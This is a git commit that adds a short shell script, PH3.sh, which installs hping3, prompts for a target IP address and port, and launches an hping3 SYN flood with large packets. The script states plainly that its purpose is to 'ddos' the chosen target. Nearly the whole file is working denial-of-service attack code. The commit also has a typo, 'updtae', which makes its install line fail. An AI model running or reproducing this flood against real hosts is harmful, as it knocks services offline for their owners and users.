ebca1aea15f2da0dec8a9f67dcc8b0506e726572
Arthur Pons <33666394+unguest@users.noreply.github.com>
2018-08-30 19:52:29 +0200

    Add files via upload

---
+++ PH3.sh
@@ -0,0 +1,14 @@
+echo PH3 BY UNGUEST ---
+echo 'IF YOU DID NOT LAUNCHED IT AS ADMIN, QUIT AND DO SO :)'
+ram='r'
+read $ram
+sudo apt-get updtae && sudo apt-get install hping3
+clear
+echo enter the ip adress to ddos : 
+ip='0.0.0.0'
+read ip
+echo enter the port to ddos : 
+port='0000'
+read port
+echo 'Please note that requests are about to use a large part of your bandwidth...'
+sudo hping3 -S -d 65495 --flood -p $port $ip
